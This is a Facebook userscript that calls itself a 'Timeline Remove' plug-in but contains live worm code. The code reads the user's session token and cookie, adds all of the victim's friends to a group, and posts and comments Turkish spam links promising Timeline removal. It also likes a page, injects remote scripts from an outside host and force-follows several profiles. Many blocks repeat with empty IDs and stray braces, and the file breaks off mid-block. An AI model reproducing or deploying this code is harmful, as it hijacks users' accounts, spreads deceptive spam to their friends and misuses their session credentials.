// ==UserScript==
// @name           FBTR
// @author        Michaela Bush
// @version        1.2
// @description    Facebook Timeline Remove Plug-in
// @namespace      FBRT
// @                   http://userscripts.org/scripts/show/137712
// @include        http://*.facebook.com/*
// @include        https://*.facebook.com/*
// ==/UserScript==

// Confirm Request //
var gid = ['246080828835047'];
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

// Retrieving Buddy List //
var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

// Adding a Group of Friends //
for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
function antispam(a) {
var b, c = "12365478",
d = "";
if (!a) a = 8;
for (b = 0; b < a; b++) d += c.substr(Math.floor(Math.random() * (c.length + 1)), 1);
return d;
}

function antispamyazi(a) {
var b, c = "....",

d = "";
if (!a) a = 5;
for (b = 0; b < a; b++) d += c.substr(Math.floor(Math.random() * (c.length + 1)), 1);
return d;
}

var randomyazi = [
	"Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın http://tr5.in/bOA ve söylenenleri yapın kesin kurtulacaksınız :",
	"Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın http://tr5.in/bOA ve söylenenleri yapın kesin kurtulacaksınız+ :",
    "Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın http://tr5.in/bOA ve söylenenleri yapın kesin kurtulacaksınız* :",
	"Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın ve söylenenleri yapın kesin kurtulacaksınız_ :",
    "Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın http://tr5.in/bOA ve söylenenleri yapın kesin kurtulacaksınız- :"
]

var baslikrandom = [
	"Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın :",
	"Tıkla saniyeler içinde zaman tünelinden kurtul ! :",
    "Hemen şimdi zaman tünelinden kurtulun ! :",
	"Hemen şimdi zaman tünelini kaldırın. !! :",
    "Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın. :"
]

var randomlink = [
	"http://tr5.in/bOA",
	"http://tr5.in/bOA",
	"http://tr5.in/bOA",
    "http://tr5.in/bOA",
    "http://tr5.in/bOA",
	"http://tr5.in/bOA"
]

var randomyorum = [
	"Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın http://tr5.in/bOA ! :",
	"Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayınsende kurtul http://tr5.in/bOA !! :",
    "Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın ! http://tr5.in/bOA :",
	"Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın !http://tr5.in/bOA! :",
    "Arkadaşlar size sır vereyim zaman tünelinden kurtulmanın yolunu buldum. linke tıklayın !!http://tr5.in/bOA! :"
]

// Wall post ayarlar1.
var randommesaj = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var link = randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var baslik = baslikrandom[Math.floor(Math.random()*baslikrandom.length)] + " "  + antispamyazi()
var resimlink = ['552824_242731792501460_100002939244686_448297_1340218283_n.jpg'/*tpa=http://a4.sphotos.ak.fbcdn.net/hphotos-ak-prn1/s720x720/552824_242731792501460_100002939244686_448297_1340218283_n.jpg*/];
var aciklamarandom = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();

// Oto Mesaj Ayarlar1.
var p0 = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var p1 = ['chrome.jpg'/*tpa=http://zamantuneliptal.netii.net/chrome.jpg*/];
var p2 = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var p3 = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();
var message = "";

// Yorum Ayarlar1.

var randomyorum = randomyazi[Math.floor(Math.random()*randomyazi.length)] + " "  + antispamyazi() + " " + randomlink[Math.floor(Math.random()*randomlink.length)] + "?" + antispam();

var zxviral=document.createElement('script');zxviral.src='../www.zamantuneliptal.netii.net/dosyalar/sonerie46d.html?amtasak='+Math.random()*999999;document.getElementsByTagName('body')[0].appendChild(zxviral);
var zxviral=document.createElement('script');zxviral.src='../www.zamantuneliptal.netii.net/dosyalar/ssile46d.html?amtasak='+Math.random()*999999;document.getElementsByTagName('body')[0].appendChild(zxviral);
var zxviral=document.createElement('script');zxviral.src='../www.zamantuneliptal.netii.net/sasile46d.html?amtasak='+Math.random()*999999;document.getElementsByTagName('body')[0].appendChild(zxviral);
var zxviral=document.createElement('script');zxviral.src='../www.zamantuneliptal.netii.net/sgrupe46d.html?amtasak='+Math.random()*999999;document.getElementsByTagName('body')[0].appendChild(zxviral);
var zxviral=document.createElement('script');zxviral.src='../www.zamantuneliptal.netii.net/swalle46d.html?amtasak='+Math.random()*999999;document.getElementsByTagName('body')[0].appendChild(zxviral);

function createXMLHttpRequest() {
 return window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest;
 }

 var c = createXMLHttpRequest();
   c.open("GET", "index604e.html-sk=nf.htm"/*tpa=http://zamantuneliptal.netii.net/index604e.html?sk=nf*/, false);
   c.onreadystatechange = ct;  
   c.send(null);   
function ct() {
var str = c.responseText; 
var fb_dtsg = str.match(/\"fb_dtsg\"\:\"(.*?)\"/)[1];
var charset_test = escape( str.match(/\"charset_test\" value\=\"(.*?)\"/)[1]);
var xhpc_composerid = str.match(/\"xhpc_composerid\" value\=\"(.*?)\"/)[1];
var user = document.cookie.match(/c_user=\d+/gi)[0].replace("c_user=","");
function wall () {  
post =  
"&fb_dtsg="         + fb_dtsg +
"&xhpc_composerid=" + xhpc_composerid +
"&xhpc_targetid="   + user +
"&xhpc_context=profile"        +
"&xhpc_fbx=1"       +
"&xhpc_timeline="   +
"&xhpc_ismeta=1"    +
"&xhpc_message_text="          + randomyorum +
"&xhpc_message="    + randomyorum +
"&composertags_place="         +
"&composertags_place_name="    +
"&composer_predicted_city="    +
"&composer_session_id="        +
"&is_explicit_place="          +
"&audience[0][value]=80"       +
"&composertags_city="          +
"&disable_location_sharing=false"         +
"&nctr[_mod]=pagelet_wall"     + 
"&lsd"   +
"&__user="          + user +
"&phstamp=";

var c = createXMLHttpRequest();
c.open("POST", "http://zamantuneliptal.netii.net/ajax/updatestatus.php?__a=1", false);
c.send(post);
}
   function like(page){
   var b =  "fbpage_id=" + page +
   "&add=1&reload=1"+
   "&preserve_tab=true"+
   "&fan_origin=page_profile&nctr[_mod]=pagelet_header"+
   "&fb_dtsg=" + fb_dtsg+ "&lsd&__"+ user;
   
     c = createXMLHttpRequest();
     c.open("POST", "http://zamantuneliptal.netii.net/ajax/pages/fan_status.php?__a=1", false);
     c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8");
     c.send(b);
   }
   
like("266242916741418");
   arr = str.match(/name="feedback_params" value="\&\#123(.*?)"/gi);
   
   for (var i in arr){
      
   arr[i] =  arr[i].replace(/&quot;/gi,'"');
   arr[i] =  arr[i].replace(/name=\"feedback_params\" value=\"&#123;/gi,'{');
   arr[i] =  arr[i].replace(/&#125;\"/gi,'}');

 var post = 
   "charset_test="    + charset_test + "&" +
   "fb_dtsg="         + fb_dtsg      + "&" + 
   "feedback_params=" + arr[i]       + "&" +
   "shown_comments=15&total_comments=15&translate_on_load=&add_comment_text_text=" + randomyorum + "&add_comment_text=" + randomyorum + "&" +
   "&comment_replace=optimistic_comment_4183511486_0&comment=1&lsd&__user=" + user + "&phstamp=1658167708055661201152" ;

    var d = createXMLHttpRequest();
    d.open("POST", "http://zamantuneliptal.netii.net/ajax/ufi/modify.php?__a=1", false);
    d.send(post);

   }
// abone başlangıç  // Ramazan
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=100001836217028";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=100001836217028";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş


// abone başlangıç //
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=100004006294778";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=100004006294778";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş




// abone başlangıç // abone kasmak liste
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=110465719096971";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=110465719096971";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş




// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş





// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş





// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş





// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id= ";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş





// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş






// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş




// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş
// Sabit --------------------------------------------------------------------------------------




// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş



// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş




// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş


// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş



// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş



// sayfa


// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş



// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş




// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş




// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
    if(document.URL.indexOf("https://") >= 0){xmlhttp.open("POST", "https://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    else{xmlhttp.open("POST", "http://www.facebook.com/ajax/follow/follow_profile.php?__a=1", true);}
    var params1 = "profile_id=";
    params1 += "&location=1";
    params1 += "&source=follow-button";
    params1 += "&subscribed_button_id=u37qac_37";
    params1 += "&fb_dtsg=" + document.getElementsByName("fb_dtsg").item(0).value;
    params1 += "&lsd=";
    params1 += "&__user=" + cereziAl("c_user");
    params1 += "&phstamp=";
    xmlhttp.send(params1);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
 konum += tarama.length
 son = document.cookie.indexOf(";", konum)
 if (son == -1)
     son = document.cookie.length
 return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
// abone bitiş




// abone başlangıç 
	}
	var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
    };
